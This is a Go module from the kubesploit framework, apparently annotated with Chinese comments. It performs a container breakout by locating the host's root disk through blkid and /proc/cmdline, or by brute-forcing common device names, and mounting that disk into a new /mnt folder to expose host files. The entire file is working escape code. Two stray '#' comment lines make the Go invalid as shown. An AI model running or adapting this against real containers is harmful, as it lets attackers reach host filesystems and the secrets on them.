# `kubesploit\data\modules\sourcecode\go\mountBreakout\main.go`

```go
package main

import (
    "fmt"  // 导入 fmt 包，用于格式化输出
    "io/ioutil"  // 导入 ioutil 包，用于读取文件内容
    "os"  // 导入 os 包，提供操作系统功能
    "os/exec"  // 导入 exec 包，用于执行外部命令
    "strconv"  // 导入 strconv 包，用于字符串和数字之间的转换
    "strings"  // 导入 strings 包，提供字符串操作函数
)

// 根据设备类型提取设备信息
func extractDeviceType(deviceType string) (string,error) {
    var err error  // 定义错误变量
    var device string  // 定义设备变量

    if deviceType != "" {  // 如果设备类型不为空
        cmd := exec.Command("blkid")  // 创建执行命令对象
        stdout, err := cmd.Output()  // 执行命令并获取输出
        if err == nil {  // 如果执行命令没有错误
            //fmt.Println(string(stdout))  // 打印命令输出
            lines := strings.Split(string(stdout), "\n")  // 将输出按行分割
            for _, line := range lines {  // 遍历每一行
                if strings.Contains(line, "ext4") {  // 如果行包含 "ext4"
                    deviceSplitted := strings.Split(line, ":")  // 使用冒号分割行
                    device = deviceSplitted[0]  // 获取设备信息
                    break  // 结束循环
                }
            }
        }

    } else {  // 如果设备类型为空
        foundUUID := false  // 定义是否找到 UUID 的标志
        dat, err := ioutil.ReadFile("/proc/cmdline")  // 读取 /proc/cmdline 文件内容
        if err == nil {  // 如果读取文件没有错误
            cmdline := string(dat)  // 将文件内容转换为字符串
            splittedCmdLine := strings.Split(cmdline, " ")  // 使用空格分割字符串

            var uuid string  // 定义 UUID 变量

            // 提取设备的 UUID
            for _, splitLine := range splittedCmdLine {  // 遍历每个分割后的字符串
                if strings.HasPrefix(splitLine, "root=UUID") {  // 如果字符串以 "root=UUID" 开头
                    uuid = splitLine[10:]  // 获取 UUID
                    foundUUID = true  // 设置找到 UUID 的标志为 true
                }
            }

            if foundUUID {  // 如果找到了 UUID
                cmd := exec.Command("blkid")  // 创建执行命令对象
                stdout, err := cmd.Output()  // 执行命令并获取输出

                if err == nil {  // 如果执行命令没有错误
                    //fmt.Println(string(stdout))  // 打印命令输出
                    lines := strings.Split(string(stdout), "\n")  // 将输出按行分割
                    for _, line := range lines {  // 遍历每一行
                        if strings.Contains(line, uuid) {  // 如果行包含 UUID
                            deviceSplitted := strings.Split(line, ":")  // 使用冒号分割行
                            device = deviceSplitted[0]  // 获取设备信息
                        }
                    }
                }
            }
        }
    }

    return device,err  // 返回设备信息和错误
}

// 主函数，设备列表
func mainfunc(device string, useBruteforce string, deviceType string){
    var err error  // 定义错误变量
    var devices []string  // 定义设备列表
    // 检查设备是否为空或者为"none"
    // 如果是，根据是否使用暴力破解来添加已知设备到设备列表中
    if device == "" || device == "none" {
        if useBruteforce == "true" {
            // 使用暴力破解已知设备
            fmt.Println("[*] Using brute force on known devices [\"/dev/sda1\", \"/dev/xvda1\"]")
            devices = append(devices, "/dev/sda1")
            devices = append(devices, "/dev/xvda1")
        } else {
            // 如果不使用暴力破解，尝试从设备类型中提取设备名称
            device, err = extractDeviceType(deviceType)
            if device == "" || err != nil {
                // 如果无法找到设备名称，使用暴力破解已知设备
                fmt.Println("[*] Didn't find device name, using brute force on known devices [\"/dev/sda1\", \"/dev/xvda1\"]")
                devices = append(devices, "/dev/sda1")
                devices = append(devices, "/dev/xvda1")
            } else {
                // 否则将提取到的设备名称添加到设备列表中
                devices = append(devices, device)
            }
        }
    } else {
        // 如果设备不为空且不为"none"，直接将设备添加到设备列表中
        devices = append(devices, device)
    }

    // 创建文件夹
    dirId := 0
    var dirPath string

    // 如果没有权限在根目录下写入，考虑写入到 /tmp
    for {
        dirPath = "/mnt" + strconv.Itoa(dirId)
        if _, err := os.Stat(dirPath); os.IsNotExist(err) {
            os.Mkdir(dirPath, os.ModeDir)
            break
        } else {
            dirId += 1
        }
    }

    // 遍历设备列表，尝试挂载设备到文件夹
    for _, deviceName := range devices {
        fmt.Printf("[*] Trying to mount \"%s\" to \"%s\"\n", deviceName, dirPath)
        cmd := exec.Command("mount", deviceName, dirPath)
        _, err = cmd.Output()
        if err != nil {
            fmt.Println(err.Error())
        } else {
            fmt.Printf("[*] Mounted successfuly \"%s\" to \"%s\"\n", deviceName, dirPath)
            fmt.Printf("[*] Host folder is in: \"%s\"\n", dirPath)
        }
    }
# 结束 main 函数的定义
}

# 注释掉的代码块，不会被执行
/*
func main(){
    mainfunc("", "false", "ext4")
   // mainfunc("/dev/sda1", "false")
   // mainfunc("", "true")
}*/
```